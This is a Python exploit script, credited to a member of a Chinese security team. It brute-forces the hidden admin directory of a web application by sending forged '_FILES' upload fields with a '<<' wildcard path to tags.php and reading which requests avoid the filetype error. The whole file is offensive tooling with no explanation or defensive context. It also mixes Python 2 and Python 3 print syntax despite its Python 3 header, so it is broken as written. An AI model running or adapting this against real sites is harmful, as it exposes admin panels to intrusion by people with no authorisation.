#!/usr/bin/env python
# -*- coding:utf-8 -*-
'''/*
    * author = Mochazz
    * team   = 红日安全团队
    * env    = pyton3
    *
    */
'''
import requests
import itertools
characters1 = "abcdefghijklmnopqrstuvwxyz0123456789_!+=@$%#"
characters = "abcdefghijklmnopqrstuvwxyz0123456789_!+=@$%#"
back_dir = ""
flag = 0
url = "http://***********/tags.php"
data = {
    "_FILES[mochazz][tmp_name]" : "./{p}<</images/admin_top_logo.gif",
    "_FILES[mochazz][name]" : 0,
    "_FILES[mochazz][size]" : 0,
    "_FILES[mochazz][type]" : "image/gif"
}

for i in characters1:
    if flag:
        break
    for j in characters:
        pre = ''+i+j
        data["_FILES[mochazz][tmp_name]"] = data["_FILES[mochazz][tmp_name]"].format(p=pre)
        print("testing",pre)
        r = requests.post(url,data=data)
        print r.text
        if "Upload filetype not allow !" not in r.text and r.status_code == 200:
            flag = 1
            back_dir = pre
            data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/admin_top_logo.gif"
            break
        else:
            data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/admin_top_logo.gif"
print("[+] 前缀为：",back_dir)
if back_dir == '':
    print "I don't fucking get anything."
    exit()
flag = 0
for i in range(30):
    if flag:
        break
    for ch in characters:
        if ch == characters[-1]:
            flag = 1
            break
        data["_FILES[mochazz][tmp_name]"] = data["_FILES[mochazz][tmp_name]"].format(p=back_dir+ch)
        r = requests.post(url, data=data)
        if "Upload filetype not allow !" not in r.text and r.status_code == 200:
            back_dir += ch
            print("[+] ",back_dir)
            data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/admin_top_logo.gif"
            break
        else:
            data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/admin_top_logo.gif"

print("后台地址为：",back_dir)